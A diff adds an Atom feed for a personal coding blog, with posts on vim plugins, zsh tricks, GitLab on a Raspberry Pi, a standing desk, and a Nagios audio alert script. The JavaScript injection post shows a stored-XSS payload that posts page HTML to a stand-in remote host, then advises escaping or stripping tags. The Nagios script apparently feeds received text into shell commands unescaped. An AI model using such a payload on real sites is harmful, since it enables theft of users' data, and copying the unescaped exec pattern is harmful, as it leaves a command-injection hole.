@@ -1,0 +1,512 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title><![CDATA[Ricos New Blog]]></title>
+  <subtitle><![CDATA[I just love coding]]></subtitle>
+  <link href="/atom.xml" rel="self"/>
+  <link href="http://midnightcodr.github.io/"/>
+  <updated>2014-11-03T04:06:10.357Z</updated>
+  <id>http://midnightcodr.github.io/</id>
+  
+  <author>
+    <name><![CDATA[Rico Chen]]></name>
+    
+  </author>
+  
+  <generator uri="http://zespia.tw/hexo/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[Tips to make the life of coding a whole lot easier]]></title>
+    <link href="http://midnightcodr.github.io/2014/11/02/Tips-to-make-the-life-of-coding-a-whole-lot-easier/"/>
+    <id>http://midnightcodr.github.io/2014/11/02/Tips-to-make-the-life-of-coding-a-whole-lot-easier/</id>
+    <published>2014-11-02T19:14:07.000Z</published>
+    <updated>2014-11-02T19:21:38.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="If_you_are_using_vim,_you_should_give_the_following_plug-ins_a_try">If you are using vim, you should give the following plug-ins a try</h2>
+<ul>
+<li>comment/uncomment codes easy with <a href="https://github.com/tomtom/tcomment_vim" target="_blank" rel="external">tcomment-vim</a></li>
+<li>syntax checking plugin <a href="https://github.com/scrooloose/syntastic" target="_blank" rel="external">Syntastic</a></li>
+<li><a href="https://github.com/honza/vim-snippets" target="_blank" rel="external">snipMate</a> provides time-saving snippets for most of the programming languages</li>
+<li><a href="https://github.com/airblade/vim-gitgutter" target="_blank" rel="external">vim-gitgutter</a> for better git integration</li>
+<li><a href="https://github.com/maksimr/vim-jsbeautify" target="_blank" rel="external">vim-jsbeautify</a> for javascript code beautifying</li>
+</ul>
+<p>I have put together the above goodies into my <a href="https://github.com/midnightcodr/dotvim" target="_blank" rel="external">dotvim repo</a>. Use it if you like.</p>
+<h2 id="Install_node_module_underscore-cli">Install node module <a href="https://github.com/ddopson/underscore-cli" target="_blank" rel="external">underscore-cli</a></h2>
+<p>One of the useful features that I use almost daily is to format json data in more human-readable format.</p>
+<h2 id="Use_$__to_reference_the_last_argument_in_the_last_shell_command">Use $_ to reference the last argument in the last shell command</h2>
+<p>Example usage:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">mkdir</span> -<span class="keyword">p</span> /var/www/html/mysite/blog/</div><div class="line"><span class="keyword">vi</span> $_/<span class="built_in">index</span>.html</div></pre></td></tr></table></figure>
+
+<h2 id="Use_pbcopy_if_you_are_using_Mac_OSX">Use pbcopy if you are using Mac OSX</h2>
+<p><code>pbcopy</code> copies conent (from stdin) into clipboard, so if you have need to pipe the output of say, 20000 lines of text, into system clipboard, you can do</p>
+<p><code>cat input_file|pbcopy</code></p>
+<h2 id="Use_oh-my-zsh">Use oh-my-zsh</h2>
+<p>It’s way more powerful than bash and I strongly recommend any programmer switch right away. With it you can do some very cool stuff like the followings</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cd <span class="keyword">...</span> (the equivilent of cd ../..)</div><div class="line"><span class="comment"># you have folders ~/var/www/html/mysite/blog/ and ~/var/www/html/another/blog/ , your pwd is the first one (~/var/www/html/mysite/blog/) and you want to go into the second directory, simply do</span></div><div class="line">cd mysite another</div></pre></td></tr></table></figure>
+
+<h2 id="Use_the_following_command_to_switch_between_current_and_the_previous_directories">Use the following command to switch between current and the previous directories</h2>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> -</div></pre></td></tr></table></figure>
+
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="If_you_are_using_vim,_you_should_give_the_following_plug-ins_a_try">If you are using vim, you should give the following plug-ins a t]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[I just built my first standing desk]]></title>
+    <link href="http://midnightcodr.github.io/2014/03/23/i-just-built-my-first-standing-desk/"/>
+    <id>http://midnightcodr.github.io/2014/03/23/i-just-built-my-first-standing-desk/</id>
+    <published>2014-03-23T21:38:00.000Z</published>
+    <updated>2014-11-02T16:58:16.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="So_it’s_for_real">So it’s for real</h2>
+<p>I’ve always wanted to build a standing desk using Ikea parts. Other people have done it with Finnvard height adjustable table legs (<a href="http://www.ikea.com/us/en/catalog/products/00144763/" target="_blank" rel="external">http://www.ikea.com/us/en/catalog/products/00144763/</a>) and a table top. My plan was put off because the Long Island Ikdea store discontinued the Finnvard legs for some time. I was lucky to find them in-store again this weekend and Voilà - my dream desk is finally built:</p>
+<img src="/images/standing_desk_1.JPG" class="center"><br><img src="/images/standing_desk_2.JPG" class="left"><br><img src="/images/standing_desk_3.JPG" class="center">
+
+<p>I bought this $40 stool just incase I need to take a short break from standing:<br><a href="http://www.ikea.com/us/en/catalog/products/50199215/" target="_blank" rel="external">http://www.ikea.com/us/en/catalog/products/50199215/</a></p>
+<p>I also like the fact that I am able to stuff my laser printer onto the shell:</p>
+<img src="/images/standing_desk_4.JPG" class="center">
+
+<h2 id="Here’s_the_recipe">Here’s the recipe</h2>
+<p>1 x Linnmon table top, <a href="http://www.ikea.com/us/en/catalog/products/50251350/" target="_blank" rel="external">http://www.ikea.com/us/en/catalog/products/50251350/</a>, $40</p>
+<p>2 x Finnvard table legs <a href="http://www.ikea.com/us/en/catalog/products/00144763/" target="_blank" rel="external">http://www.ikea.com/us/en/catalog/products/00144763/</a>, $30 ea</p>
+<p>1 x Tertial Work lamp, <a href="http://www.ikea.com/us/en/catalog/products/20370383/" target="_blank" rel="external">http://www.ikea.com/us/en/catalog/products/20370383/</a>, $9</p>
+<p>Total: $109+Tax</p>
+<h2 id="Note">Note</h2>
+<p>I didn’t do some serious hack to increase the height of the table legs like this guy did <a href="http://www.ikeahackers.net/2014/02/convert-the-finnvard-into-a-height-adjustable-standing-desk.html" target="_blank" rel="external">http://www.ikeahackers.net/2014/02/convert-the-finnvard-into-a-height-adjustable-standing-desk.html</a> because the legs are able to reach upto 36 5/8, with 1” for the table top, the final result is 37 5/8, which is pretty close to my ideal desk height (the height where elbows can rest on the table top).</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="So_it’s_for_real">So it’s for real</h2>
+<p>I’ve always wanted to build a standing desk using Ikea parts. Other people have done it w]]>
+    </summary>
+    
+      <category term="DIY" scheme="http://midnightcodr.github.io/categories/DIY/"/>
+    
+      <category term="fun" scheme="http://midnightcodr.github.io/categories/DIY/fun/"/>
+    
+      <category term="standing desk" scheme="http://midnightcodr.github.io/categories/DIY/fun/standing-desk/"/>
+    
+      <category term="ikea" scheme="http://midnightcodr.github.io/categories/DIY/fun/standing-desk/ikea/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Install Gitlab(6.4) on Raspberry PI]]></title>
+    <link href="http://midnightcodr.github.io/2014/01/11/install-gitlab-6-dot-4-on-raspberry-pi/"/>
+    <id>http://midnightcodr.github.io/2014/01/11/install-gitlab-6-dot-4-on-raspberry-pi/</id>
+    <published>2014-01-11T14:31:00.000Z</published>
+    <updated>2014-11-02T16:41:56.000Z</updated>
+    <content type="html"><![CDATA[<p>I am a big fan of both Raspberry PI and Gitlab so it kinda bugs me when my attempts to install Gitlab onto RPI didn’t succeed because of failure to install therubyracer gem. Others experienced the similar problems I encountered: <a href="http://www.raspberrypi.org/phpBB3/viewtopic.php?t=32716&amp;p=397934" target="_blank" rel="external">http://www.raspberrypi.org/phpBB3/viewtopic.php?t=32716&amp;p=397934</a>, by following most of user dpenezic’s instruction I finally made it to install Gitlab (currently at version 6.4) onto my RPI (512MB Ram but only 384MB is available to the system as I allocate the rest to GPU). So here are what I did:</p>
+<h2 id="Steps">Steps</h2>
+<p>1) Follow <a href="https://github.com/gitlabhq/gitlabhq/blob/6-4-stable/doc/install/installation.md" target="_blank" rel="external">https://github.com/gitlabhq/gitlabhq/blob/6-4-stable/doc/install/installation.md</a> until “Install Gems”</p>
+<p>2) Install libv8 (<a href="https://github.com/cowboyd/libv8" target="_blank" rel="external">https://github.com/cowboyd/libv8</a>)</p>
+<pre><code><span class="comment"># [update: added git-svn to the list on 1/17/2014]</span>
+<span class="built_in">sudo</span> apt-get install -y subversion git-svn
+[ <span class="operator">-d</span> ~/tmp ] || mkdir ~/tmp
+<span class="built_in">cd</span> ~/tmp
+git clone https://github.com/cowboyd/libv8
+<span class="built_in">cd</span> libv8
+bundle install
+<span class="comment"># be patient, the following command takes a while</span>
+bundle <span class="keyword">exec</span> rake clean build binary
+<span class="built_in">sudo</span> gem install pkg/libv8-<span class="number">3.11</span>.<span class="number">8.17</span>-armv6l-linux.gem
+</code></pre><p>3) Modify /home/git/gitlab/Gemfile (and .lock) to skip installation of libv8 (as it’s installed through the above step) and the rubyracer</p>
+<pre><code>cd /home/git/gitlab
+sudo -u git -H editor <span class="type">Gemfile</span>    <span class="comment"># and remove the line: gem "therubyracer"</span>
+sudo -u git -H editor <span class="type">Gemfile</span>.lock    <span class="comment"># and removed the following lines</span>
+    libv8 (<span class="number">3</span>.<span class="number">16</span>.<span class="number">14</span>.<span class="number">3</span>)
+    therubyracer (<span class="number">0</span>.<span class="number">12</span>.<span class="number">0</span>)
+      libv8 (~&gt; <span class="number">3</span>.<span class="number">16</span>.<span class="number">14</span>.<span class="number">0</span>)
+      <span class="keyword">ref</span>
+</code></pre><p>4) Install node.js, you can take a look at the script I came up with to compile node.js in RPI: <a href="https://github.com/midnightcodr/rpi_node_install" target="_blank" rel="external">https://github.com/midnightcodr/rpi_node_install</a></p>
+<p>5) Now you can resume the “Install Gems” step in the Gitlab installation guide</p>
+<pre><code><span class="built_in">sudo</span> -u git -H bundle install --deployment --without development test postgres aws
+<span class="comment"># and the rest</span>
+</code></pre><h2 id="Notes">Notes</h2>
+<p>1) 384MB is not enough to run “Compile assets” step on the gitlab installation guide so I had to add some more swap memory by following <a href="http://www.cyberciti.biz/faq/linux-add-a-swap-file-howto/" target="_blank" rel="external">http://www.cyberciti.biz/faq/linux-add-a-swap-file-howto/</a></p>
+<pre><code><span class="built_in">sudo</span> dd <span class="keyword">if</span>=/dev/zero of=/swapfile1 bs=<span class="number">1024</span> count=<span class="number">524288</span>
+<span class="built_in">sudo</span> mkswap /swapfile1
+<span class="built_in">sudo</span> chmod <span class="number">0600</span> /swapfile1
+<span class="built_in">sudo</span> swapon /swapfile1
+</code></pre><p>2) Make sure the server_name setting in /etc/nginx/sites-available/gitlab matches gitlab_url in /home/git/gitlab-shell/config.yml, also add an entry to your RPI’s /etc/hosts</p>
+<pre><code><span class="number">127.0</span>.<span class="number">0.1</span>    gitlab.server.<span class="built_in">hostname</span>
+</code></pre><p>3) With the current version of Gitlab, performance is not that bad at all - it takes about 2 seconds to switch pages.</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>I am a big fan of both Raspberry PI and Gitlab so it kinda bugs me when my attempts to install Gitlab onto RPI didn’t succeed because of ]]>
+    </summary>
+    
+      <category term="gitlab" scheme="http://midnightcodr.github.io/categories/gitlab/"/>
+    
+      <category term="raspberrypi" scheme="http://midnightcodr.github.io/categories/gitlab/raspberrypi/"/>
+    
+      <category term="rpi" scheme="http://midnightcodr.github.io/categories/gitlab/raspberrypi/rpi/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[A few zsh tricks]]></title>
+    <link href="http://midnightcodr.github.io/2013/11/09/a-few-zsh-tricks/"/>
+    <id>http://midnightcodr.github.io/2013/11/09/a-few-zsh-tricks/</id>
+    <published>2013-11-09T22:53:00.000Z</published>
+    <updated>2014-11-02T16:41:56.000Z</updated>
+    <content type="html"><![CDATA[<p>Here are a few zsh tricks that I learned (and enjoy using) recently:</p>
+<h4 id="The_basics_-_use_!!_to_retrieve_last_command">The basics - use !! to retrieve last command</h4>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function_or_atom">tail</span> /<span class="function_or_atom">var</span>/<span class="function_or_atom">log</span>/<span class="function_or_atom">message</span></div><div class="line"><span class="exclamation_mark">!</span><span class="exclamation_mark">!</span></div></pre></td></tr></table></figure>
+
+<h4 id="The_not_so_basic_-_get_last_parameter_of_last_command_with_!$">The not so basic - get last parameter of last command with !$</h4>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">mkdir</span> new_folder</div><div class="line"><span class="keyword">cd</span> !$	# after this <span class="keyword">command</span> you will <span class="keyword">be</span> in folder new_folder</div></pre></td></tr></table></figure>
+
+<h4 id="Get_all_parameters_from_the_last_command_with_!*">Get all parameters from the last command with !*</h4>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">diff src/file1 dest/</div><div class="line"><span class="keyword">cp</span> !*</div></pre></td></tr></table></figure>
+
+<h4 id="The_pretty_awsome_-_substitution_with_!!:s/from/to_or_!!:gs/from/to">The pretty awsome - substitution with !!:s/<em>from</em>/<em>to</em> or !!:gs/<em>from</em>/<em>to</em></h4>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vi src/en/file.txt</div><div class="line">!!<span class="symbol">:s/en/fr</span></div></pre></td></tr></table></figure>
+
+<pre><code>diff src/en/file.txt dest/en/file.txt
+!!<span class="symbol">:gs/en/fr</span>        <span class="comment"># g for global substitution</span>
+</code></pre><h4 id="Even_better_with_^">Even better with ^</h4>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">vi src<span class="regexp">/en/</span><span class="keyword">file</span>.txt</div><div class="line">^en^fr</div><div class="line"></div><div class="line">diff src<span class="regexp">/en/</span><span class="keyword">file</span>.txt dest<span class="regexp">/en/</span><span class="keyword">file</span>.txt</div><div class="line">^en^fr^:G</div></pre></td></tr></table></figure>
+
+<h4 id="Switching_between_directories_with_similar_structure_(added_Dec_7,_2013)">Switching between directories with similar structure (added Dec 7, 2013)</h4>
+<p>let’s say you are in ~/dev/myproject1/src/lib/, and you want to cd to  ~/dev/myproject2/src/lib/, all you need to do is</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> myproject1 myproject2</div></pre></td></tr></table></figure>
+
+<p>or even</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> <span class="number">1</span> <span class="number">2</span></div></pre></td></tr></table></figure>
+
+<h4 id="Batch_renaming_with_zmv">Batch renaming with zmv</h4>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="title">autoload</span> zmv</div><div class="line">zmv <span class="string">'(*).txt'</span> <span class="string">'<span class="variable">$1</span>.dat'</span>	<span class="comment"># change *.txt to *.dat</span></div></pre></td></tr></table></figure>
+
+<p>see more zmv examples at <a href="http://zshwiki.org/home/builtin/functions/zmv" target="_blank" rel="external">http://zshwiki.org/home/builtin/functions/zmv</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Here are a few zsh tricks that I learned (and enjoy using) recently:</p>
+<h4 id="The_basics_-_use_!!_to_retrieve_last_command">The basics]]>
+    </summary>
+    
+      <category term="shell" scheme="http://midnightcodr.github.io/categories/shell/"/>
+    
+      <category term="zsh" scheme="http://midnightcodr.github.io/categories/shell/zsh/"/>
+    
+      <category term="command-line" scheme="http://midnightcodr.github.io/categories/shell/zsh/command-line/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Use && to simplify js codes]]></title>
+    <link href="http://midnightcodr.github.io/2013/07/20/use-and-and-in-to-simplify-codes/"/>
+    <id>http://midnightcodr.github.io/2013/07/20/use-and-and-in-to-simplify-codes/</id>
+    <published>2013-07-20T06:46:00.000Z</published>
+    <updated>2014-11-02T17:30:53.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="The_technique_will_be_illustrated_by_the_following_simple_js_codes:">The technique will be illustrated by the following simple js codes:</h2>
+<figure class="highlight js"><figcaption><span>demo</span><a href="/downloads/code/js-reg-and.js">download</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> s=<span class="string">'data0'</span>, m=<span class="regexp">/^([a-z]+)(\d+)$/</span>.exec(s);</div><div class="line"></div><div class="line"><span class="comment">/* the most common (and obvious) way to </span></div><div class="line"> * check if there is match and the 2nd captured group's value is 0</div><div class="line"> * would be</div><div class="line">*/</div><div class="line"><span class="keyword">if</span>(m) {</div><div class="line">	<span class="keyword">if</span>( m[<span class="number">2</span>] === <span class="string">'0'</span> ) {</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">'maybe'</span>);</div><div class="line">	}</div><div class="line">}</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* but the above code can be simplified to */</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>( m &amp;&amp; m[<span class="number">2</span>] === <span class="string">'0'</span>) {</div><div class="line">	<span class="built_in">console</span>.log(<span class="string">'maybe'</span>);</div><div class="line">}</div><div class="line"></div><div class="line"><span class="comment">/* the technique can also be used in switch-case statement */</span></div><div class="line"> </div><div class="line"><span class="keyword">switch</span>( m &amp;&amp; m[<span class="number">2</span>] ) {</div><div class="line">	<span class="keyword">case</span> <span class="string">'1'</span>:</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">'never'</span>);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="string">'0'</span>:</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">'maybe'</span>);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">'run out of options'</span>)</div><div class="line">}</div></pre></td></tr></table></figure>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="The_technique_will_be_illustrated_by_the_following_simple_js_codes:">The technique will be illustrated by the following simple js co]]>
+    </summary>
+    
+      <category term="programming" scheme="http://midnightcodr.github.io/categories/programming/"/>
+    
+      <category term="javascript" scheme="http://midnightcodr.github.io/categories/programming/javascript/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Javascript injection attack - what is it and how to prevent]]></title>
+    <link href="http://midnightcodr.github.io/2013/06/15/javascript-injection-attack-what-is-it-and-how-to-prevent/"/>
+    <id>http://midnightcodr.github.io/2013/06/15/javascript-injection-attack-what-is-it-and-how-to-prevent/</id>
+    <published>2013-06-16T00:46:00.000Z</published>
+    <updated>2014-11-02T16:41:56.000Z</updated>
+    <content type="html"><![CDATA[<p>Yes we’ve heard of the term “Javascript injection” from time to time but have you ever wonder how it actually works? In this post I will use a very simple example to demostrate how a potential attacker can take advantage of this kind of vulnerability.</p>
+<p>Let’s say we build a user forum which only registered user can view its content. One of the basic feature of a forum is to allow user to create new topics or reply to existing topics. In either case we need to create some html form to accept user inputs. We are very aware of MySQL injection so we use prepared statement to store topic content into the database. All is well but we</p>
+<ul>
+<li>forgot to sanitize the topic body (and/or other related fields such as subject) before storing to database</li>
+<li>render content from database as is without using proper escaping. So if an attacker enters the following content into the topic body:</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Hello there.</div><div class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">	<span class="keyword">var</span> _info=$(<span class="string">'body'</span>).html();</div><div class="line">	$.post(<span class="string">'http://some.remote.host/'</span>,{data:_info});</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>
+
+<p>When the topic gets rendered in a normal user’s browser, user will see “Hello there” in the topic content. Under the hood the page’s html source code (which might contains some information only the user should  have access to) will be sent to a remote host that the attacker has access to without user’s awareness as the js code is not rendered (but it does get executed in user’s browser). If $(‘body’) contains too much info, the attacker can choose to steal information specific element (or elements).</p>
+<p>To prevent this kind of attack, we need to either:<br>Properly escape content from the server when rendering in the browser.<br>or<br>Strip tags such as <code>&lt;script&gt;</code>, or only allow tags such as p, br when storing user input into database.</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Yes we’ve heard of the term “Javascript injection” from time to time but have you ever wonder how it actually works? In this post I will ]]>
+    </summary>
+    
+      <category term="javascript" scheme="http://midnightcodr.github.io/categories/javascript/"/>
+    
+      <category term="security" scheme="http://midnightcodr.github.io/categories/javascript/security/"/>
+    
+      <category term="injection attack" scheme="http://midnightcodr.github.io/categories/javascript/security/injection-attack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Nagios audio alert with Mac OS X]]></title>
+    <link href="http://midnightcodr.github.io/2013/05/09/nagios-audio-alert-with-mac-os-x/"/>
+    <id>http://midnightcodr.github.io/2013/05/09/nagios-audio-alert-with-mac-os-x/</id>
+    <published>2013-05-10T00:50:00.000Z</published>
+    <updated>2014-11-02T17:33:04.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="Background">Background</h2>
+<p>You have a nagios server running Linux and you have a nice OS at work called Mac OS X which comes with a handy text-to-speech feature. Wouldn’t it be nice if you can turn your workstation into a nagios audio alert system? In this post I’ll show you extactly how you can achieve that.</p>
+<h2 id="Requirements">Requirements</h2>
+<ul>
+<li>node.js installed on the client, along with a module called execSync (installed by command <code>npm install -g execSync</code>)</li>
+<li>nc (netcat) is installed on the nagios server (most distro comes with it so this shouldn’t be a problem)</li>
+</ul>
+<h2 id="Code_on_the_client">Code on the client</h2>
+<figure class="highlight js"><figcaption><span>/usr/local/bin/nagios-audio-alert.js</span><a href="/downloads/code/nagios-audio-alert.js">download</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* /usr/local/bin/nagios-audio-alert.js */</span></div><div class="line"><span class="keyword">var</span> dgram = <span class="built_in">require</span>(<span class="string">'dgram'</span>)</div><div class="line">	, server = dgram.createSocket(<span class="string">'udp4'</span>)</div><div class="line">	, exec=<span class="built_in">require</span>(<span class="string">'execSync'</span>).exec</div><div class="line">	, server_port=<span class="number">20123</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ts_log</span><span class="params">(_msg)</span> </span>{</div><div class="line">	<span class="built_in">console</span>.log(<span class="string">'[%s] %s'</span>, <span class="keyword">new</span> <span class="built_in">Date</span>().toString(), _msg);</div><div class="line">}</div><div class="line"></div><div class="line">server.on(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span> <span class="params">(msg, rinfo)</span> </span>{</div><div class="line">	<span class="keyword">var</span> pmsg=msg.toString().replace(<span class="regexp">/^\s+|\s+$/</span>, <span class="string">''</span>)</div><div class="line">	<span class="keyword">if</span>(pmsg===<span class="string">'X'</span>) { <span class="keyword">return</span>; }</div><div class="line">	<span class="keyword">if</span>(pmsg!==<span class="string">''</span>) {</div><div class="line">		ts_log(<span class="string">"server got: "</span> + msg + <span class="string">" from "</span> + rinfo.address + <span class="string">":"</span> + rinfo.port);</div><div class="line">		<span class="keyword">var</span> arr=pmsg.split(<span class="regexp">/::/</span>);</div><div class="line">		<span class="keyword">if</span>(arr.length&gt;<span class="number">2</span>) {</div><div class="line">			<span class="keyword">var</span> msg_target=arr[<span class="number">0</span>], msg_state=arr[<span class="number">1</span>], msg_body=arr[<span class="number">2</span>];</div><div class="line">			<span class="keyword">if</span>(msg_state===<span class="string">'PROBLEM'</span>) {</div><div class="line">				exec(<span class="string">'afplay /System/Library/Sounds/Glass.aiff'</span>)</div><div class="line">				exec(<span class="string">'afplay /System/Library/Sounds/Glass.aiff'</span>)</div><div class="line">				<span class="keyword">if</span>(msg_target===<span class="string">'host'</span>) {</div><div class="line">					exec(<span class="string">'say "Attention Please, host '</span>+msg_body+<span class="string">' is having a problem."'</span>);</div><div class="line">				} <span class="keyword">else</span> <span class="keyword">if</span> (msg_target===<span class="string">'service'</span>) {</div><div class="line">					exec(<span class="string">'say "May I have your attention please, service problem: '</span>+msg_body+ <span class="string">'"'</span>);</div><div class="line">				}</div><div class="line">			} <span class="keyword">else</span> {</div><div class="line">				ts_log(<span class="string">'Received a message regarding nagios alert'</span>+msg_body);</div><div class="line">			}</div><div class="line">		} <span class="keyword">else</span> {</div><div class="line">			ts_log(<span class="string">'Not a valid message ('</span>+pmsg+<span class="string">')'</span>);</div><div class="line">		}</div><div class="line">	} <span class="keyword">else</span> {</div><div class="line">		ts_log(<span class="string">'Blank or space only message received.'</span>);</div><div class="line">	}</div><div class="line">});</div><div class="line"></div><div class="line">server.on(<span class="string">"listening"</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>{</div><div class="line">  <span class="keyword">var</span> address = server.address();</div><div class="line">  ts_log(<span class="string">"server listening "</span> + address.address + <span class="string">":"</span> + address.port);</div><div class="line">});</div><div class="line">server.bind(server_port);</div></pre></td></tr></table></figure><br>Run the code from terminal:<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">node <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>nagios-audio-alert.js</div></pre></td></tr></table></figure>
+
+<h2 id="Do_some_test_runs_on_the_client">Do some test runs on the client</h2>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="title">echo</span> <span class="string">"service::PROBLEM::service down test"</span>|nc -u -w <span class="number">1</span> <span class="number">127.0.0.1</span> <span class="number">20123</span></div><div class="line">echo <span class="string">"host::PROBLEM::host test123 is down"</span>|nc -u -w <span class="number">1</span> <span class="number">127.0.0.1</span> <span class="number">20123</span></div></pre></td></tr></table></figure>
+
+<p>If everything goes well, ^C to exit the nagios-audio-alert.js program and move on to nagios server.</p>
+<h2 id="Modification_to_nagios_server’s_config_files">Modification to nagios server’s config files</h2>
+<ul>
+<li>command.cfg</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">...</span></div><div class="line">define command{</div><div class="line">	command_name    notify-host-by-tts</div><div class="line">	command_line /usr/bin/printf <span class="string">"host::$NOTIFICATIONTYPE$::$HOSTNAME$ is $HOSTSTATE$"</span>|nc -u -v -w <span class="number">1</span> &lt;replace_with_ip_of_mac_client&gt; <span class="number">20123</span></div><div class="line">}</div><div class="line"><span class="keyword">...</span></div></pre></td></tr></table></figure>
+
+<ul>
+<li>template.cfg</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">...</span></div><div class="line">define contact{</div><div class="line">	name                            generic-contact         ; The name of this contact template</div><div class="line">	service_notification_period     24x7                    ; service notifications can be sent anytime</div><div class="line">	host_notification_period        24x7                    ; host notifications can be sent anytime</div><div class="line">	service_notification_options    u,c,r,f,s               ; send notifications <span class="keyword">for</span> all service states, flapping events, and scheduled downtime events</div><div class="line">	host_notification_options       d,u,r,f,s               ; send notifications <span class="keyword">for</span> all host states, flapping events, and scheduled downtime events</div><div class="line">	<span class="comment">#service_notification_commands   notify-service-by-email        ; send service notifications via email</span></div><div class="line">	service_notification_commands   notify-service-by-tts,notify-service-by-email	; notify thru audio & email</div><div class="line">	<span class="comment">#host_notification_commands      notify-host-by-email   ; send host notifications via email</span></div><div class="line">	host_notification_commands      notify-host-by-tts,notify-host-by-email</div><div class="line">	register                        <span class="number">0</span>                       ; DONT REGISTER THIS 